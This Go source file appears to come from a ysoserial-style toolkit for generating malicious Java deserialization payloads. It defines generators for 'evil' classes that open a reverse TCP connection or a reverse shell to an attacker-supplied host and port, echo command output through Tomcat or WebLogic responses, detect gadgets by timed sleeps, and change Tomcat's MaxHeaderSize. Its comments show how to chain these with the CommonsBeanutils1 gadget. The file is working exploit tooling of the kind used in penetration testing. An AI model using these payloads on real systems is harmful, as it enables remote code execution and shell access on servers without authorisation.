// This function is used in conjunction with the useModifyTomcatMaxHeaderSizeTemplate function to generate a Java object that modifies tomcats MaxHeaderSize value when deserialized.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // Generates and configures the ModifyTomcatMaxHeaderSize Java object
// ```
func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassModifyTomcatMaxHeaderSizeTemplate())...)
	return config.GenerateClassObject()
}

// GenEmptyClassInTemplateClassObject generates a javaclassparser.ClassObject object using the EmptyClassInTemplate class template.
// Empty class generation (for template)
// ```
func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = EmptyClassInTemplate
	return config.GenerateClassObject()
}

// SetClassTcpReverseTemplate
// useTcpReverseTemplate request parameter option function, used to set the template to generate the TcpReverse class. It needs to be used in conjunction with tcpReverseHost and tcpReversePort.
// also needs to be used with tcpReverseToken to indicate whether the reverse connection is successful.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetClassTcpReverseTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
	}
}

// SetTcpReverseHost
// tcpReverseHost request parameter option function, sets the specified tcpReverseHost domain name, and needs to be used in conjunction with useTcpReverseTemplate and tcpReversePort.
// also needs to be used with tcpReverseToken to indicate whether the reverse connection is successful.
// host: The host of tcpReverseHost to be set.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseHost(host string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Host = host
	}
}

// SetTcpReversePort
// tcpReversePort request parameter option function, sets the specified tcpReversePort domain name, and needs to be used in conjunction with useTcpReverseTemplate and tcpReverseHost.
// also needs to be used with tcpReverseToken to indicate whether the reverse connection is successful.
// port: The port of tcpReversePort to be set.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReversePort(port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Port = port
	}
}

// SetTcpReverseToken
// tcpReverseToken request parameter option function, sets the specified token to indicate whether the reverse connection is successful, and needs to be used in conjunction with useTcpReverseTemplate, tcpReverseHost, and tcpReversePort.
// token: the token to be set.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseToken(token string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Token = token
	}
}

// SetTcpReverseEvilClass
// useTcpReverseEvilClass requests the parameter option function, sets the template to generate the TcpReverse class, and sets the specified tcpReverseHost and tcpReversePort.
// is equivalent to the combination of useTcpReverseTemplate and tcpReverseHost functions.
// host: The host of tcpReverseHost to be set.
// port: The port of tcpReversePort to be set.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
		config.Host = host
		config.Port = port
	}
}

// GenTcpReverseClassObject
// GenerateTcpReverseEvilClassObject Generates a javaclassparser.ClassObject object using the TcpReverse class template,
// This function uses the useTcpReverseTemplate, tcpReverseHost, and tcpReversePort functions in combination to generate a Java object that will deserialize the specified tcpReverseHost and tcpReversePort during deserialization.
// host: The host of tcpReverseHost to be set.
// port: The port of tcpReversePort to be set.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// host = "Public IP"
// token = uuid()
// classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // generates and configures the TcpReverse Java object
// ```
func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseClass
	return config.GenerateClassObject()
}

// SetClassTcpReverseShellTemplate
// useTcpReverseShellTemplate request parameter option function, used to set the template to generate the TcpReverseShell class. It needs to be used in conjunction with tcpReverseShellHost and tcpReverseShellPort.
// The difference between this parameter and useTcpReverseTemplate is that the class generated by this parameter will execute a rebound after the reverse connection is successful. shell.
// Example:
// ```
// host = "Public IP"
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
// ```
func SetClassTcpReverseShellTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
	}
}

// SetTcpReverseShellEvilClass
// useTcpReverseShellEvilClass request parameter option function, set the template to generate the TcpReverseShell class, and set the specified tcpReverseShellHost and tcpReverseShellPort.
// is equivalent to the combination of three functions: useTcpReverseShellTemplate, tcpReverseShellHost, and tcpReverseShellPort.
// host: The host of the tcpReverseShellHost to be set.
// port: the port of the tcpReverseShellPort to be set.
// Example:
// ```
// host = "Public IP"
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
// ```
func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
		config.Host = host
		config.Port = port
	}
}

// GenTcpReverseShellClassObject
// GenerateTcpReverseShellEvilClassObject Generates a javaclassparser.ClassObject object using the TcpReverseShell class template,
// This function uses the useTcpReverseShellTemplate, tcpReverseShellHost, and tcpReverseShellPort functions in combination to generate a Java object that will deserialize the specified tcpReverseShellHost and tcpReverseShellPort during deserialization.
// host: The host of the tcpReverseShellHost to be set.
// port: the port of the tcpReverseShellPort to be set.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// host = "Public IP"
// classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // generates and configures the TcpReverseShell Java object
// ```
func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseShellClass
	return config.GenerateClassObject()
}

// SetClassTomcatEchoTemplate
// useTomcatEchoTemplate request parameter option function is used to set the template to generate the TomcatEcho class. It needs to be used in conjunction with useHeaderParam or useEchoBody and useParam.
// Example:
// ```
// body echoes
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassTomcatEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}

// SetTomcatEchoEvilClass
// useTomcatEchoEvilClass request parameter option function, set TomcatEcho class needs to be used with useHeaderParam or useEchoBody and useParam.
// have the same function as useTomcatEchoTemplate.
// Example:
// ```
// body echoes
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetTomcatEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}

// GenTomcatEchoClassObject
// GenerateTomcatEchoEvilClassObject generates a javaclassparser.ClassObject object using the TomcatEcho class template.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// body echoes
// bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = TomcatEchoClass
	return config.GenerateClassObject()
}

// SetClassMultiEchoTemplate
// useClassMultiEchoTemplate request parameter option function, used to set the template to generate MultiEcho class, mainly used for Tomcat/Weblogic echo needs to be used in conjunction with useHeaderParam or useEchoBody or useParam.
// Example:
// ```
// body echoes
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassMultiEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}

// SetMultiEchoEvilClass
// useMultiEchoEvilClass request parameter option function, set the MultiEcho class, mainly used for Tomcat/Weblogic echo needs to be used in conjunction with useHeaderParam or useEchoBody or useParam.
// has the same function as useClassMultiEchoTemplate.
// Example:
// ```
// body echoes
// bodyClassObj,_ =  yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetMultiEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}

// GenMultiEchoClassObject
// GenerateMultiEchoEvilClassObject Generates a javaclassparser.ClassObject object using the MultiEcho class template, mainly used for Tomcat/Weblogic echoes,
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// body echoes
// bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header echoes
// headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = MultiEchoClass
	return config.GenerateClassObject()
}

// SetClassHeaderEchoTemplate
// useHeaderEchoTemplate request parameter option function, used to set the template for generating the HeaderEcho class, and needs to be used in conjunction with useHeaderParam.
// automatically finds the Response object and echoes the specified content in the header. It should be noted that when sending the Payload generated when this function is sent, the header needs to be set: Accept-Language: zh-CN,zh;q=1.9 to trigger echo.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassHeaderEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = HeaderEchoClass
	}
}

// SetHeaderEchoEvilClass
// useHeaderEchoEvilClass request parameter option function, set the HeaderEcho class, and need to be used in conjunction with useHeaderParam.
// has the same function as useHeaderEchoTemplate.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetHeaderEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = HeaderEchoClass
	}
}

// GenHeaderEchoClassObject
// GenerateHeaderEchoClassObject generates a javaclassparser.ClassObject object using the HeaderEcho class template.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = HeaderEchoClass
	return config.GenerateClassObject()
}

// SetClassSleepTemplate
// useSleepTemplate request parameter option function, used to set the template to generate the Sleep class. It needs to be used in conjunction with useSleepTime. It is mainly used to specify the sleep duration and is used for delayed detection of gadgets.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // After sending the generated Payload, observe whether the response time is greater than 5s.
// ```
func SetClassSleepTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SleepClass
	}
}

// SetSleepEvilClass
// useSleepEvilClass requests the parameter option function and sets the Sleep class. It needs to be used in conjunction with useSleepTime.
// has the same function as useSleepTemplate
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // After sending the generated Payload, observe whether the response time is greater than 5s.
// ```
func SetSleepEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SleepClass
	}
}

// GenSleepClassObject
// GenerateSleepClassObject generates a javaclassparser.ClassObject object using the Sleep class template.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// yso.GenerateSleepClassObject(yso.useSleepTime(5))
// ```
func GenSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = SleepClass
	return config.GenerateClassObject()
}

// SetSleepTime
// useSleepTime request parameter option function to set the specified sleep duration. It needs to be used in conjunction with useSleepTemplate. It is mainly used to specify the sleep duration and is used for delay detection of gadgets.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // After sending the generated Payload, observe whether the response time is greater than 5s.
// ```
func SetSleepTime(time int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.SleepTime = time
	}
}
